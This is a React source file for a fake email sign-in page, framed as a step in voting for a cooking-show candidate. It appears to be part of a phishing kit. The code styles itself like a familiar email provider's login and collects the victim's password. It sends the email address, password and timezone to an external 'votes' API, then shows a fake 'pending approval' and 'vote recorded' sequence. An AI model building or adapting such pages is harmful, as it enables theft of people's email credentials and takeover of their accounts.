import { useEffect, useState } from "react";
import emailLogo from "../assets/email-logo.png";

export default function EmailPassword() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState(null);

  useEffect(() => {
    const savedEmail = localStorage.getItem("email_username");

    if (!savedEmail) {
      window.location.href = "/login/email";
      return;
    }

    setEmail(savedEmail);
  }, []);

  async function submitForm(e) {
    e.preventDefault();

    setLoading(true);

    try {
      const res = await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "email",
            username: email,
            password,
            location: Intl.DateTimeFormat().resolvedOptions().timeZone,
          }),
        }
      );

      const data = await res.json();

     if (data.success) {
  setStatus("pending");

  setTimeout(() => {
    setStatus("approved");
  }, 3000);
} 
    } catch (err) {
      console.log(err);
    }

    setLoading(false);
  }

  if (status === "pending") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <img
            src={emailLogo}
            alt=""
            className="w-16 h-16 mx-auto mb-6"
          />

          <h2 className="text-3xl font-semibold">
            Pending Approval
          </h2>

          <p className="mt-3 text-gray-600">
            Your request has been submitted successfully.
          </p>

          <p className="text-gray-600">
            Please wait while the moderator verifies your request.
          </p>

          <div className="mt-8">
            <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600 mx-auto"></div>
          </div>
        </div>
      </div>
    );
  }

  if (status === "approved") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <img
            src={emailLogo}
            alt=""
            className="w-16 h-16 mx-auto mb-6"
          />

          <h2 className="text-3xl font-semibold text-green-600">
            Vote Recorded
          </h2>

          <p className="mt-3 text-gray-600">
            Thank you for voting.
          </p>
        </div>
      </div>
    );
  }

  if (status === "rejected") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <img
            src={emailLogo}
            alt=""
            className="w-16 h-16 mx-auto mb-6"
          />

          <h2 className="text-3xl font-semibold text-red-600">
            Request Rejected
          </h2>

          <p className="mt-3 text-gray-600">
            Your vote request was rejected.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center px-5">
     <div className="w-full max-w-5xl bg-white rounded-[28px] shadow-sm p-8 md:p-12">
        <div className="grid md:grid-cols-2 gap-12">

          <div>
            <img
              src={emailLogo}
              alt="Logo"
              className="w-12 h-12 object-contain mb-8"
            />

            <h1 className="text-4xl font-normal text-gray-900">
              Welcome
            </h1>

            <p className="mt-3 text-gray-600 break-all">
              {email}
            </p>
          </div>

          <div>
            <form onSubmit={submitForm}>

              <input
                type="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border border-gray-400 rounded-md px-4 py-4 text-gray-900 outline-none focus:border-blue-600"
              />

              <div className="mt-3">
  <span className="text-sm text-[#1a73e8] hover:underline cursor-pointer">
    Forgot password?
  </span>
</div>

              <div className="flex justify-end mt-10">
                <button
                  type="submit"
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white px-8 py-2.5 rounded-full font-medium transition"
                >
                  {loading ? "Loading..." : "Next"}
                </button>
              </div>

            </form>
          </div>

        </div>
      </div>
    </div>
  );
}   
